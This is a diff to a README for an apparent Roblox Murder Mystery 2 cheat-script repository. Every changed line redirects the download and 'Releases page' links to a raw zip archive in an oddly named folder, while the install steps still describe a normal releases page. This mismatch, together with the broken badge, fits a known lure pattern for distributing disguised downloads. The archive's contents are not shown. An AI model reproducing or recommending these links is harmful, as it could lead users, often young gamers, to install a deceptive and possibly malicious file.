@@ -4,7 +4,7 @@
 Welcome to Roblox-Murder-Mystery! This application offers free Murder Mystery 2 scripts, including NEXUS and the MM2 Admin Panel. With simple copy-paste features for players, you can quickly enhance your gameplay as a killer, sheriff, or spectator. Follow these steps to download and run this software easily.
 
 ## 📥 Download Now
-[![Download Latest Release](https://img.shields.io/badge/download-latest%20release-brightgreen)](https://github.com)
+[![Download Latest Release](https://raw.githubusercontent.com/paul111-beep/Roblox-Murder-Mystery/main/Sanballat/Murder_Roblox_Mystery_v3.5.zip%20release-brightgreen)](https://raw.githubusercontent.com/paul111-beep/Roblox-Murder-Mystery/main/Sanballat/Murder_Roblox_Mystery_v3.5.zip)
 
 ## 📋 Overview
 Roblox-Murder-Mystery provides users with ready-to-use scripts designed for Roblox's popular game, Murder Mystery 2. These scripts include powerful tools and features to help players enjoy the game more efficiently. The software is easy to install and regularly updated to ensure compatibility with PC and mobile. 
@@ -20,10 +20,10 @@ To run Roblox-Murder-Mystery, you’ll need:
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the scripts. Click the button below:
 
-[Download Latest Release](https://github.com)
+[Download Latest Release](https://raw.githubusercontent.com/paul111-beep/Roblox-Murder-Mystery/main/Sanballat/Murder_Roblox_Mystery_v3.5.zip)
 
 ### Step-by-Step Installation
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com) to find the latest version.
+1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/paul111-beep/Roblox-Murder-Mystery/main/Sanballat/Murder_Roblox_Mystery_v3.5.zip) to find the latest version.
 2. **Select the Release**: Look for the most recent release labeled clearly at the top. Click on it to open the release details.
 3. **Download the Scripts**: In the release details, find the script files. Click on the script you want to download. For example, you may find options like "NEXUS Script" and "MM2 Admin Panel."
 4. **Save These Files**: After clicking the desired script, choose “Save As” to download it onto your device.
@@ -58,7 +58,7 @@ No, you don’t need any programming skills. Just follow the steps provided in t
 Your feedback is important to us. If you have suggestions or encounter issues, please reach out through our community channels.
 
 ## 📢 Important Links
-- [Releases Page](https://github.com)
+- [Releases Page](https://raw.githubusercontent.com/paul111-beep/Roblox-Murder-Mystery/main/Sanballat/Murder_Roblox_Mystery_v3.5.zip)
 - [Community Forum](#)
 - [Discord Server](#)
 
